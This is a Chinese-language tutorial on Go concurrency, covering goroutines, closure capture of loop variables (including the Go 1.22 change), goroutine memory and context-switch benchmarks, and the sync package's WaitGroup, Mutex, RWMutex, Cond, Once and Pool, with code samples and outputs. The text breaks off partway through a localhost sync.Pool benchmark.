sync.WaitGroup\tsayHello := func() &#123;\t\tdefer wg.Done()\t\tfmt.Println(&quot;hello&quot;)\t&#125;\twg.Add(1)\tgo sayHello()\twg.Wait() // 这就是连接点的使用方式&#125;\n\n输出如下： hello\n这个例子将决定main goroutine,直到goroutine托管sayHello函数为止。我们在示例中使用了许多匿名函数来创建快速goroutine样例。让我们把注意力转移到闭包上。闭包可以从创建它们的作用域中获取变量。如果你在goroutine中运行一个闭包，那么闭包是在这些变量的副本上运行，还是原值的引用上运行？让我们试试看：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar wg sync.WaitGroup\tsalutation := &quot;hello&quot;\twg.Add(1)\tgo func() &#123;\t\tdefer wg.Done()\t\tsalutation = &quot;welcome&quot; // 尝试修改 salutation 变量\t&#125;()\twg.Wait()\tfmt.Println(salutation)&#125;\n\n运行结果：welcome事实证明，goroutine在它们所创建的相同地址空间内执行，因此我们的程序打印出“welcome”这个词。让我们再看一个例子。你认为这个程序会输出什么？\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar wg sync.WaitGroup\tfor _, salutation := range []string&#123;&quot;hello&quot;, &quot;greetings&quot;, &quot;good day&quot;&#125; &#123;\t\twg.Add(1)\t\tgo func() &#123;\t\t\tdefer wg.Done()\t\t\tfmt.Println(salutation) // 引用了字符串类型的切片作为创建循环变量的salutation值\t\t&#125;()\t\twg.Wait()\t&#125;&#125;\n\n答案比大多数人想象的要复杂得多，而且是为数不多的令人惊讶的事情之一。大多数人直觉上认为这将会不确定顺序地打印出“hello”“greetings”和“good day”,但看看它做了什么：\ngood daygood daygood day\n\n这里真的是这样吗？在我电脑上的输出是符合大多数人的直觉的：会以不确定的顺序打印出“hello”“greetings”和“good day”。为什么呢？查了资料后发现，这是循环迭代器变量引用的问题：常见错误 For 语句在1.22及后不会出现循环迭代器变量引用的问题。每个循环迭代器变量都是一个新的副本，所以上面程序的输出会是：\nhellogreetingsgood day\n\n并且是乱序的（每次输出都不一致），下面的讨论在1.22之前，1.22及后不会出现。在上面的示例中，goroutine正在运行一个闭包，该闭包使用变量salutation时，字符串的迭代已经结束。当我们循环迭代时，salutation被分配到slice literal中的下一个字符串值。因为计划中的goroutine可能在未来的任何时间点运行，它不确定在goroutine中会打印出什么值。在性能比较好的机器上，在goroutine开始之前循环有很高的概率会退出。这意味着变量的salutation值不在范围之内。然后会发生什么呢？goroutine还能引用一些已经超出范围的东西吗？goroutine不会访问那些可能被垃圾回收的内存吗？这是一个关于如何管理内存的有趣的点。Go语言运行时会足够小心地将对变量salutation值的引用仍然保留，由内存转移到堆，以便goroutine可以继续访问它。\n通常在我的计算机上，在任何goroutine开始运行之前，循环就会退出，所以salutation会被转移到堆中，在我的字符串切片中引用最后一个值“good day”。所以我通常会看到三次“good day”。编写这个循环的正确方法是将salutation的副本传递到闭包中，这样当goroutine运行时，它将从循环的迭代中操作数据：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar wg sync.WaitGroup\tfor _, salutations := range []string&#123;&quot;hello&quot;, &quot;greetings&quot;, &quot;good day&quot;&#125; &#123;\t\twg.Add(1)\t\tgo func(salutations string) &#123;\t\t\tdefer wg.Done()\t\t\tfmt.Println(salutations)\t\t&#125;(salutations)\t&#125;\twg.Wait()&#125;\n\n当然，在1.22及以后的版本是不需要这么写的。\n这些goroutine在相同的地址空间中运行，并且只有简单的宿主函数，所有使用goroutine编写非并发代码是非常自然的。Go语言的编译器很好地处理了内存中的变量，这样goroutine就不会意外地访问被释放的内存，这使得开发人员可以专注于他们的问题空间而不是内存管理。然而，这不是一张空白支票。\n由于多个goroutine可以在同一个地址空间上运行，所以我们仍然需要担心同步问题。正如我们已经讨论过的，我们可以选择同步访问goroutine访问的共享内存，或者可以使用CSP原语通过通信来共享内存。\ngoroutine的另一个好处是它们非常轻。下面是“Go语言FAQ”的摘录：\n\n一个新创建的goroutine被赋予了几千字节，这在大部分情况都是足够的。当它不运行时，Go语言运行时就会自动增长（缩小）存储堆栈的内存，允许许多goroutine存在适当的内存中。每个函数调用CPU的开销平均为3个廉价指令。在同一个地址空间中创建成千上万的goroutine是可行的。如果goroutine只是线程，系统的资源消耗会更小。\n\n每个goroutine几千字节，这并没有什么问题！让我们来验证一下。但是在我们开始之前，我们必须讨论一个关于goroutine有趣的事情：GC并没有回收被丢弃的goroutine。如果我写如下代码：\npackage mainfunc main() &#123;\tgo func() &#123;\t\t//将永远阻塞的操作\t&#125;()\t//开始工作&#125;\n\n这里的goroutine将一直存在直到进程退出（协程泄露！）。在下一个例子中，我们将利用这一点来实际测算goroutine的大小。\n在下面的例子中，我们将goroutine不被GC的事实与运行时的自省能力结合起来，并测算在goroutine创建之前和之后分配的内存数量：\npackage mainimport (\t&quot;fmt&quot;\t&quot;runtime&quot;\t&quot;sync&quot;)func main() &#123;\tmemConsumed := func() uint64 &#123;\t\truntime.GC()\t\tvar s runtime.MemStats\t\truntime.ReadMemStats(&amp;s)\t\treturn s.Sys\t&#125;\tvar c &lt;-chan any\tvar wg sync.WaitGroup\tnoop := func() &#123; wg.Done(); &lt;-c &#125;\tconst numGoroutines = 1e6\twg.Add(numGoroutines)\tbefore := memConsumed()\tfor i := numGoroutines; i &gt; 0; i-- &#123;\t\tgo noop()\t&#125;\twg.Wait()\tafter := memConsumed()\tfmt.Printf(&quot;%fkb&quot;, float64(after-before)/numGoroutines/1024)&#125;\n\n我们需要一个永远不会退出的goroutine.,这样就可以在内存中保留一段时间用于测侧算。定义了要创建的goroutine的数量。我们将用大数定律，渐渐地接近一个goroutine的大小。输出结果为：8.560508kb，这里go版本为1.22.4。老版本goroutine的大小会更小。\n理论上百万个goroutine内存占用只有9G。这也足以说明goroutine的轻量。可能会影响性能的是上下文切换，即当一个被托管的并发进程必须保存它的状态以切换到一个不同的运行并发进程时。如果我们有太多的并发进程，可能会将所有的CPU时间消耗在它们之间的上下文切换上，而没有资源完成任何真正需要CPU的工作。在操作系统级别，使用线程可能非常昂贵。OS线程必须保存如寄存器值、查找表和内存映射之类的东西，以便能够在有限的时间内成功地切换回当前线程。然后，它必须为传入的线程加载相同的信息。\n软件中的上下文切换相对来说要廉价得多。在一个软件定义的调度器下，运行时可以更有选择性地保存数据用于检索，如何持久化，以及何时需要持久化。让我们来看看在OS线程和goroutine之间切换的上下文的相对性能。首先，我们将利用Linux的内置基准测试套件来度量在相同核心的两个线程之间发送消息需要多长时间（需要安装perf工具，需要与内核版本匹配：sudo apt install linux-tools-common linux-tools-generic）：taskset -c 0 perf bench sched pipe -T\n输出如下：\n# Running &#x27;sched/pipe&#x27; benchmark:# Executed 1000000 pipe operations between two threads     Total time: 5.855 [sec]       5.855618 usecs/op         170776 ops/sec\n\n这个基准实际上度量了在线程上发送和接收消息所需的时间，因此我们将计算结果并将其除以2。我们用了2.927μs来进行上下文切换。这看起来不算太糟，但还是保留判断，直到我们检查goroutine之间的上下文切换。\n我们将使用Go语言构建一个类似的基准。下面的示例将创建两个goroutine并在它们之间发送一条消息：\npackage mainimport (\t&quot;sync&quot;\t&quot;testing&quot;)func BenchmarkContextSwitch(b *testing.B) &#123;\tvar wg sync.WaitGroup\tbegin := make(chan struct&#123;&#125;)\tc := make(chan struct&#123;&#125;)\tvar token struct&#123;&#125;\tsender := func() &#123;\t\tdefer wg.Done()\t\t&lt;-begin\t\tfor i := 0; i &lt; b.N; i++ &#123;\t\t\tc &lt;- token\t\t&#125;\t&#125;\treceiver := func() &#123;\t\tdefer wg.Done()\t\t&lt;-begin\t\tfor i := 0; i &lt; b.N; i++ &#123;\t\t\t&lt;-c\t\t&#125;\t&#125;\twg.Add(2)\tgo sender()\tgo receiver()\tb.StartTimer()\tclose(begin)\twg.Wait()&#125;\n\n运行结果（go test -bench=. -cpu=1）：\nBenchmarkContextSwitch   6329348        218.8 ns/opPASSok   learn 1.582s\n\n每个上下文切换需要218.8ns，2.927μs的7.48%很难断言goroutine会导致上下文切换过于频繁，但上限可能不会成为使用goroutine的阻碍。\nsync包sync包包含对低级别内存访问同步最有用的并发原语。如果你使用的语言主要通过内存访问同步来处理并发，那么你可能已经熟悉了这些类型。Go语言和这些语言之间的区别在于，Go语言已经在内存访问同步原语之上构建了一组新的并发原语，以向你提供一组扩展的工作。正如我们在第2章“Go语言的并发哲学”中所讨论的，这些操作都有它们的用途，主要是在诸如struct这样的小范围内。由你决定何时进行内存访问同步。说到这里，让我们开始看一下sync包公开的各种原语。\nWaitGroup当你不关心并发操作的结果，或者你有其他方法来收集它们的结果时，WaitGroup是等待一组并发操作完成的好方法。如果这两个条件都不满足，我建议你使用channel和select语句。下面是一个使用WaitGroup等待goroutine完成的基本例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;\t&quot;time&quot;)func main() &#123;\tvar wg sync.WaitGroup\twg.Add(1)\tgo func() &#123;\t\tdefer wg.Done()\t\tfmt.Println(&quot;1st goroutine sleeping...&quot;)\t\ttime.Sleep(1)\t&#125;()\twg.Add(1)\tgo func() &#123;\t\tdefer wg.Done()\t\tfmt.Println(&quot;2nd goroutine sleeping...&quot;)\t\ttime.Sleep(2)\t&#125;()\twg.Wait()\tfmt.Println(&quot;All goroutines completed.&quot;)&#125;\n\n输出如下：\n2nd goroutine sleeping...1st goroutine sleeping...All goroutines completed.\n\n可以将WaitGroup视为一个并发-安全的计数器：调用通过传入的整数执行add方法增加计数器的增量，并调用Done方法对计数器进行递减。Wait阻塞，直到计数器为零。\n注意，添加的Add调用是在他们帮助跟踪的goroutine之外完成的。如果我们不这样做，我们就会引人一种竞争条件，因为在本章前面“goroutines’”中，我们不能保证goroutine何时会被调度，可以在goroutine开始调度前调用Wait方法。如果将调用Add的方法添加到goroutine的闭包中，那么Wait调用可能会直接返回，而且不会阻塞，因为Add调用不会发生。\n互斥锁与读写锁Mutex 是“互斥”的意思，是保护程序中临界区的一种方式。临界区是你程序中需要独占访问共享资源的区域。Mutex提供了一种安全的方式来表示对这些共享资源的独占访问。为了使用一个资源，channel通过通信共享内存，而Mutex通过开发人员的约定同步访问共享内存。你可以通过使用Mutex对内存进行保护来协调对内存的访问。这里有一个简单的例子，两个goroutine试图增加和减少一个共同的值，它们使用Mutex互斥锁来同步访问：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar count int\tvar lock sync.Mutex\tincrement := func() &#123;\t\tlock.Lock()\t\tdefer lock.Unlock()\t\tcount++\t\tfmt.Printf(&quot;Incrementing: %d\\n&quot;, count)\t&#125;\tdecrement := func() &#123;\t\tlock.Lock()\t\tdefer lock.Unlock()\t\tcount--\t\tfmt.Printf(&quot;Decrementing: %d\\n&quot;, count)\t&#125;\t// 增量\tvar arithmetic sync.WaitGroup\tfor i := 0; i &lt;= 5; i++ &#123;\t\tarithmetic.Add(1)\t\tgo func() &#123;\t\t\tdefer arithmetic.Done()\t\t\tincrement()\t\t&#125;()\t&#125;\t// 减量\tfor i := 0; i &lt;= 5; i++ &#123;\t\tarithmetic.Add(1)\t\tgo func() &#123;\t\t\tdefer arithmetic.Done()\t\t\tdecrement()\t\t&#125;()\t&#125;\tarithmetic.Wait()\tfmt.Println(&quot;Arithmetic complete.&quot;)&#125;\n\n输出如下：\nIncrementing: 1Decrementing: 0Decrementing: -1Incrementing: 0Decrementing: -1Decrementing: -2Incrementing: -1Incrementing: 0Arithmetic complete.\n\n你会注意到，我们总是在defer语句中调用Unlock。这是一个十分常见的习惯用法，它使用Mutex互斥锁来确保即使出现了panic,调用也总是发生。如果不这样做，可能会导致程序陷人死锁。关键部分之所以如此命名，是因为它们反映了程序中的瓶颈。进入和退出一个临界区是有消耗的，所以一般人会尽量减少在临界区的时间。这样做的一个策略是减少临界区的范围。可能存在需要在多个并发进程之间共享内存的情况，但可能这些进程不是都需要读写此内存。如果是这样，你可以利用不同类型的互斥对象：sync.RWMutex。\nSync.RWMutex在概念上和互斥是一样的：它守卫着对内存的访问，然而，RWMutex让你对内存有了更多控制。你可以请求一个锁用于读处理，在这种情况下你将被授予访问权限，除非该锁被用于写处理。这意味着，任意数量的读消费者可以持有一个读锁，只要没有共他事物持有一个写锁。这里有一个例子，它演示了一个生产者，它不像代码中创建的众多消费者那样活跃：\npackage mainimport (\t&quot;fmt&quot;\t&quot;math&quot;\t&quot;os&quot;\t&quot;sync&quot;\t&quot;text/tabwriter&quot;\t&quot;time&quot;)func main() &#123;\tproducer := func(wg *sync.WaitGroup, l sync.Locker) &#123; // 第二个参数是 sync.Locker 类型。这个接口有两个方法，Lock和Unlock。go包中有两个实现，sync.Mutex和sync.RWMutex。\t\tdefer wg.Done()\t\tfor i := 5; i &gt; 0; i-- &#123;\t\t\tl.Lock()\t\t\tl.Unlock()\t\t\ttime.Sleep(1) // 让 producer 等待，使其比观察者的 goroutine 更不活跃。\t\t&#125;\t&#125;\tobserver := func(wg *sync.WaitGroup, l sync.Locker) &#123;\t\tdefer wg.Done()\t\tl.Lock()\t\tdefer l.Unlock()\t&#125;\ttest := func(count int, mutex, rwMutex sync.Locker) time.Duration &#123;\t\tvar wg sync.WaitGroup\t\twg.Add(count + 1)\t\tbeginTestTime := time.Now()\t\tgo producer(&amp;wg, mutex)\t\tfor i := count; i &gt; 0; i-- &#123;\t\t\tgo observer(&amp;wg, rwMutex)\t\t&#125;\t\twg.Wait()\t\treturn time.Since(beginTestTime)\t&#125;\ttw := tabwriter.NewWriter(os.Stdout, 0, 1, 2, &#x27; &#x27;, 0)\tdefer tw.Flush()\tvar m sync.RWMutex\tfmt.Fprintf(tw, &quot;Readers\\tRWMutext\\tMutex\\n&quot;)\tfor i := 0; i &lt; 20; i++ &#123;\t\tcount := int(math.Pow(2, float64(i)))\t\tfmt.Fprintf(\t\t\ttw,\t\t\t&quot;%d\\t%v\\t%v\\n&quot;,\t\t\tcount,\t\t\ttest(count, &amp;m, m.RLocker()),\t\t\ttest(count, &amp;m, &amp;m),\t\t)\t&#125;&#125;\n\n输出如下：\nReaders  RWMutext    Mutex1        76.0748ms   78.666ms2        77.9551ms   77.8809ms4        78.9414ms   77.7889ms8        61.973ms    78.1634ms16       77.1572ms   61.3356ms32       62.9075ms   77.792ms64       61.6918ms   76.5042ms128      61.6087ms   77.0605ms256      62.1438ms   77.894ms512      62.8352ms   46.7669ms1024     46.7329ms   47.4825ms2048     46.5684ms   31.1086ms4096     47.5138ms   62.2136ms8192     7.0075ms    38.8685ms16384    12.4982ms   4.732ms32768    6.505ms     8.7366ms65536    14.3337ms   16.2156ms131072   32.3444ms   35.852ms262144   58.6523ms   71.3403ms524288   117.7048ms  147.1611ms\n\ncond对于cond类型的注释确实很好地描述了它的用途：\n\n…一个goroutine的集合点，等待或发布一个event。\n\n在这个定义中，一个“event”是两个或两个以上的goroutine之间的任意信号，除了它已经发生的事实外，没有任何信息。通常情况下，在goroutine继续执行之前，你需要等待其中一个信号。如果我们要研究如何在没有Cond类型的情况下实现这一目标，一个简单的方法就是使用无限循环：for conditionTrue() == false &#123;&#125;然而，这将消耗一个CPU核心的所有周期。为了解决这个问题，我们可以引入一个time.Sleep：for conditionTrue() == false &#123; time.Sleep(1*time.Millisecond) &#125;这样更好，但它仍然是低效的，而且你必须弄清楚要等待多久：太长，会人为地降低性能：太短，会不必要地消耗太多的CPU时间。如果有一种方法可以让goroutine有效地等待，直到它发出信号并检查它的状态，那就更好了。这正是Cond类型为我们所做的。使用Cond,我们可以这样编写前面例子的代码：\npackage mainimport &quot;sync&quot;func main() &#123;\tc := sync.NewCond(&amp;sync.Mutex&#123;&#125;) // 实例化一个cond。NewCond函数创建一个类型，满足sync.Locker接口。这使得cond类型能够以一种并发安全的方式与其他goroutine协调\tc.L.Lock()                       // 锁定这个条件。这是必要的，因为在进入Locker的时候，执行wait会自动执行unlock。\tfor conditionTrue() == false &#123;\t\tc.Wait() // 等待通知，条件已经发生。这是一个阻塞通信，goroutine将被暂停。\t&#125;\tc.L.Unlock() // 为这个条件Locker执行解锁操作。这是必要的，因为当执行Wait退出操作的时候，它会在Locker上调用Lock方法。&#125;\n\n这种方法效率更高。注意，调用Wait不只是阻塞，它挂起了当前的goroutine,允许其他goroutine在OS线程上运行。当你调用Wait时，会发生一些其他事情：进入Wait后，在Cond变量的Locker上调用Unlock方法，在退出Wait时，在Cond变量的Locker上执行Lock方法。它实际上是方法的一个隐藏的副作用。看起来我们在等待条件发生的时候一直持有这个锁，但事实并非如此。当你浏览代码时，你需要留意这个模式。\n让我们扩展这个例子，并显示等式的两边：等待信号的goroutine和发送信号的goroutine。假设我们有一个固定长度为2的队列，还有10个我们想要推送到队列中的项目。我们想要在有房间的情况下尽快排队，所以就希望在队列中有空间时能立即得到通知。让我们尝试使用Cond来管理这种调度：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;\t&quot;time&quot;)func main() &#123;\tc := sync.NewCond(&amp;sync.Mutex&#123;&#125;)\tqueue := make([]any, 0, 10)\tremoveFromQueue := func(delay time.Duration) &#123;\t\ttime.Sleep(delay)\t\tc.L.Lock()\t\tqueue = queue[1:]\t\tfmt.Println(&quot;Removed from queue&quot;)\t\tc.L.Unlock()\t\tc.Signal()\t&#125;\tfor i := 0; i &lt; 10; i++ &#123;\t\tc.L.Lock()\t\tfor len(queue) == 2 &#123;\t\t\tc.Wait()\t\t&#125;\t\tfmt.Println(&quot;Adding to queue&quot;)\t\tqueue = append(queue, struct&#123;&#125;&#123;&#125;)\t\tgo removeFromQueue(1 * time.Second)\t\tc.L.Unlock()\t&#125;&#125;\n\n输出如下：\nAdding to queueAdding to queueRemoved from queueAdding to queueRemoved from queueAdding to queueRemoved from queueAdding to queueRemoved from queueAdding to queueRemoved from queueRemoved from queueAdding to queueAdding to queueRemoved from queueAdding to queueRemoved from queueAdding to queue\n\n该程序成功地将所有10个项目添加到队列中（并且在它有机会将前两项删除之前退出)。它也总是等待，直到至少有一个项目被排入队列，然后再进行另一个项目。在这个例子中，我们还有一个新方法，Signal。这是Cond类型提供的两种方法中的一种，它提供通知goroutine阻塞的调用Wait,条件已经被触发。另一种方法叫做Broadcast。运行时内部维护一个FIFO列表，等待接收信号；Signal发现等待最长时间的goroutine并通知它，而Broadcast向所有等待的goroutine发送信号。Broadcast可以说是这两种方法中比较有趣的一种，因为它提供了一种同时与多个goroutine通信的方法。我们可以通过channel对信号进行简单的复制，但是重复调用Broadcast的行为将会更加困难。此外，与利用channel相比，Cond类型的性能要高很多。\n为了了解使用Broadcast的方法，让我们假设正在创建一个带有按钮的GUI应用程序。我们想注册任意数量的函数，当该按钮被单击时，它将运行。Cond可以完美胜任，因为我们可以使用它的Broadcast方法通知所有注册的处理程序。让我们看看它的例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\t// 定义 Button 类型，包含 Clicked 条件\ttype Button struct &#123;\t\tClicked *sync.Cond\t&#125;\tbutton := Button&#123;Clicked: sync.NewCond(&amp;sync.Mutex&#123;&#125;)&#125;\t// 定义订阅函数，提供注册函数以处理来自条件的信号的功能\tsubscribe := func(c *sync.Cond, fn func()) &#123;\t\tvar goroutineRunning sync.WaitGroup\t\tgoroutineRunning.Add(1)\t\tgo func() &#123;\t\t\tgoroutineRunning.Done()\t\t\tc.L.Lock()\t\t\tdefer c.L.Unlock()\t\t\tc.Wait()\t\t\tfn()\t\t&#125;()\t\tgoroutineRunning.Wait()\t&#125;\tvar clickRegistered sync.WaitGroup\tclickRegistered.Add(3)\tsubscribe(button.Clicked, func() &#123;\t\tfmt.Println(&quot;Maximizing window.&quot;)\t\tclickRegistered.Done()\t&#125;)\tsubscribe(button.Clicked, func() &#123;\t\tfmt.Println(&quot;Displaying annoying dialog box!&quot;)\t\tclickRegistered.Done()\t&#125;)\tsubscribe(button.Clicked, func() &#123;\t\tfmt.Println(&quot;Mouse clicked.&quot;)\t\tclickRegistered.Done()\t&#125;)\tbutton.Clicked.Broadcast()\tclickRegistered.Wait()&#125;\n\n输出如下：\nMouse clicked.Maximizing window.Displaying annoying dialog box!\n\n可以看到，在 Click Cond 上调用 Broadcast ，所有三个处理程序都将运行。如果不是 clickRegistered 的 WaitGroup,我们可以调用button.Clicked.Broadcast()多次，并且.每次都调用三个处理程序。这是channel不太容易做到的，因此是利用Cond类型的主要原因之一。\n与sync包中所包含的大多数其他东西一样，Cond的使用最好被限制在一个紧凑的范围中，或者是通过封装它的类型来暴露在更大范围内。\nonceonce 比较简单，顾名思义：只会被执行一次。\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar count int\tincrement := func() &#123;\t\tcount++\t&#125;\tvar once sync.Once\tvar increments sync.WaitGroup\tincrements.Add(100)\tfor i := 0; i &lt; 100; i++ &#123;\t\tgo func() &#123;\t\t\tdefer increments.Done()\t\t\tonce.Do(increment)\t\t&#125;()\t&#125;\tincrements.Wait()\tfmt.Printf(&quot;Count is %d\\n&quot;, count)&#125;\n\n输出为：Count is 1\nsync.Once是一种类型，它在内部使用一些sync原语，以确保即使在不同的goroutine上，也只会调用一次Do方法处理传递进来的函数。这确实是因为我们将调用sync.Once方式执行Do方法。\n使用sync.Once有几件事需要注意。让我们看另一个例子，你认为它会打印什么？\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar count int\tincrement := func() &#123; count++ &#125;\tdecrement := func() &#123; count-- &#125;\tvar once sync.Once\tonce.Do(increment)\tonce.Do(decrement)\tfmt.Printf(&quot;Count: %d\\n&quot;, count)&#125;\n\n输出如下：Count: 1\nsync.Once只计算调用Do方法的次数，而不是多少次唯一调用Do方法。这样，sync.Once的副本与所要调用的函数紧密耦合，我们再次看到如何在一个严格的范围内合理使用sync包中的类型以发挥最佳效果。我建议你通过将sync.Once包装在一个小的语法块中来形式化这种耦合：要么是一个小函数，要么是将两者包装在一个结构体中。这个例子你认为会发生什么？\npackage mainimport (\t&quot;sync&quot;)func main() &#123;\tvar onceA, onceB sync.Once\tvar initB func()\tinitA := func() &#123; onceB.Do(initB) &#125;\tinitB = func() &#123; onceA.Do(initA) &#125; // 1\tonceA.Do(initA)                    // 2&#125;\n\n1这个调用在2返回之前不能进行。这个程序将会死锁，因为在1调用的Do直到2调用Do并退出后才会继续，这是死锁的典型例子。对一些人来说，这可能有点违反直觉，因为它看起来好像我们使用的sync.Once是为了防止多重初始化，但sync.Once唯一能保证的是你的函数只被调用一次。有时，这是通过死锁程序和暴露逻辑中的缺陷来完成的，在这个例子中是一个循环引用。\n池池(Pool)是(Pool模式)(https://zh.wikipedia.org/wiki/%E5%AF%B9%E8%B1%A1%E6%B1%A0%E6%A8%A1%E5%BC%8F)的并发安全实现。在较高的层次上，Pool模式是一种创建和提供可供使用的固定数量实例或 Pool实例的方法。它通常用于约束创建昂贵的场景（如数据库连接），以便只创建固定数量的实例，但不确定数量的操作仍然可以请求访问这些场景。对于Go语言的sync.Pool,这种数据类型可以被多个goroutine安全地使用。\nPool的主接口是它的Get方法。当调用时，Get将首先检查池中是否有可用的实例返回给调用者，如果没有，调用它的new方法来创建一个新实例。当完成时，调用者调用Put方法把工作的实例归还到池中，以供其他进程使用。这里有一个简单的例子来说明：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tmyPool := &amp;sync.Pool&#123;\t\tNew: func() any &#123;\t\t\tfmt.Println(&quot;Creating new instance.&quot;)\t\t\treturn struct&#123;&#125;&#123;&#125;\t\t&#125;&#125;\tmyPool.Get()             // 调用 Pool 的 get 方法，会执行 Pool 中定义的 New 函数，因为实例还没有实例化。 \tinstance := myPool.Get() // 同上\tmyPool.Put(instance)     // 将之前的实例放回池中，增加了池内可用数量。\tmyPool.Get()             // 再调用时，会重用之前的示例，不会调用 New 函数。&#125;\n\n我们只看到两个对New函数的调用：\nCreating new instance.Creating new instance.\n\n那么，为什么要使用 Pool,而不只是在运行时实例化对象呢？Go语言是有 GC 的，因此实例化的对象将被自动清理。有什么意义？考虑下面这个例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar numCalcsCreated int\tcalcPool := &amp;sync.Pool&#123;\t\tNew: func() any &#123;\t\t\tnumCalcsCreated += 1\t\t\tmem := make([]byte, 1024)\t\t\treturn &amp;mem // 存储bytes切片的地址\t\t&#125;,\t&#125;\t// 用4KB初始化 pool\tcalcPool.Put(calcPool.New())\tcalcPool.Put(calcPool.New())\tcalcPool.Put(calcPool.New())\tcalcPool.Put(calcPool.New())\tconst numWorkers = 1024 * 1024\tvar wg sync.WaitGroup\twg.Add(numWorkers)\tfor i := numWorkers; i &gt; 0; i-- &#123;\t\tgo func() &#123;\t\t\tdefer wg.Done()\t\t\tmem := calcPool.Get().(*[]byte)\t\t\tdefer calcPool.Put(mem)\t\t\t// 做一些有趣的假设，但是很快就会用这个内存完成\t\t&#125;()\t&#125;\twg.Wait()\tfmt.Printf(&quot;%d calculators were created.&quot;, numCalcsCreated)&#125;\n\n输出如下：23 calculators were created.如果我没有用sync.Pool运行这个例子，尽管结果是不确定的，在最坏的情况下，我可能尝试分配一个十亿字节的内存，但是正如你从输出看到的，我只分配了4KB。另一种常见的情况是，用Pool来尽可能快地将预先分配的对象缓存加载启动。在这种情况下，我们不是试图通过限制创建的对象的数量来节省主机的内存，而是通过提前加载获取引用到另一个对象所需的时间，来节省消费者的时间。这在编写高吞吐量网络服务器时十分常见，服务器试图快速响应请求。让我们来看看这样的场景。首先，让我们创建一个模拟创建到服务的连接的函数。我们会让这次连接花很长时间：\npackage mainimport &quot;time&quot;func connectToService() any &#123;\ttime.Sleep(1 * time.Second)\treturn struct&#123;&#125;&#123;&#125;&#125;\n\n接下来，让我们了解一下，如果服务为每个请求都启动一个新的连接，那么网络服务的性能如何。我们将编写一个网络处理程序，为每个请求都打开一个新的连接。为了使基准测试简单，我们只允许一次连接：\npackage mainimport (\t&quot;fmt&quot;\t&quot;log&quot;\t&quot;net&quot;\t&quot;sync&quot;\t&quot;time&quot;)func startNetworkDaemon() *sync.WaitGroup &#123;\tvar wg sync.WaitGroup\twg.Add(1)\tgo func() &#123;\t\tserver, err := net.Listen(&quot;tcp&quot;, &quot;localhost:8080&quot;)\t\tif err != nil &#123;\t\t\tlog.Fatalf(&quot;cannot listen:%v&quot;, err)\t\t&#125;\t\tdefer server.Close()\t\twg.Done()\t\tfor &#123;\t\t\tconn, err := server.Accept()\t\t\tif err != nil &#123;\t\t\t\tlog.Printf(&quot;cannot accept connection:%v&quot;, err)\t\t\t\tcontinue\t\t\t&#125;\t\t\tconnectToService()\t\t\tfmt.Fprintln(conn, &quot;&quot;)\t\t\tconn.Close()\t\t&#125;\t&#125;()\treturn &amp;wg&#125;func connectToService() any &#123;\ttime.Sleep(1 * time.Second)\treturn struct&#123;&#125;&#123;&#125;&#125;\n\n现在我们的基准如下：\npackage mainimport (\t&quot;io/ioutil&quot;\t&quot;net&quot;\t&quot;testing&quot;)func init() &#123;\tdaemonStarted := startNetworkDaemon()\tdaemonStarted.Wait()&#125;func BenchmarkNetworkRequest(b *testing.B) &#123;\tfor i := 0; i &lt; b.N; i++ &#123;\t\tconn, err := net.Dial(&quot;tcp&quot;, &quot;localhost:8080&quot;)\t\tif err != nil &#123;\t\t\tb.Fatalf(&quot;cannot dial host:%v&quot;, err)\t\t&#125;\t\tif _, err := ioutil.ReadAll(conn); err != nil &#123;\t\t\tb.Fatalf(&quot;cannot read:%v&quot;, err)\t\t&#125;\t\tconn.Close()\t&#125;&#125;\n\n输出如下：\nBenchmarkNetworkRequestBenchmarkNetworkRequest-20    \t      10\t1010578820 ns/opPASS\n\n看看 sync.Pool 改进的：\npackage mainimport (\t&quot;fmt&quot;\t&quot;log&quot;\t&quot;net&quot;\t&quot;sync&quot;\t&quot;time&quot;)func main() &#123;&#125;func warmServiceConnCache() *sync.Pool &#123;\tp := &amp;sync.Pool&#123;\t\tNew: connectToService,\t&#125;\tfor i := 0; i &lt; 10; i++ &#123;\t\tp.Put(p.New())\t&#125;\treturn p&#125;func startNetworkDaemon() *sync.WaitGroup &#123;\tvar wg sync.WaitGroup\twg.Add(1)\tgo func() &#123;\t\tconnPool := warmServiceConnCache()\t\tserver, err := net.Listen(&quot;tcp&quot;, &quot;localhost:8080&quot;)\t\tif err != nil &#123;\t\t\tlog.Fatalf(&quot;cannot listen:%v&quot;, err)\t\t&#125;\t\tdefer server.Close()\t\twg.Done()\t\tfor &#123;\t\t\tconn, err := server.Accept()\t\t\tif err != nil &#123;\t\t\t\tlog.Printf(&quot;cannot accept connection:%v&quot;, err)\t\t\t\tcontinue\t\t\t&#125;\t\t\tsvcConn := connPool.Get()\t\t\tfmt.Fprintln(conn, &quot;&quot;)\t\t\tconnPool.Put(svcConn)\t\t\tconn.Close()\t\t&#125;\t&#125;()\treturn &amp;wg&#125;func connectToService() any &#123;\ttime.Sleep(1 * time.Second)\treturn struct&#123;&#125;&#123;&#125;&#125;\n\n输出如下：\nBenchmarkNetworkRequestBenchmarkNetworkRequest-20    \t    3800\t   4567334 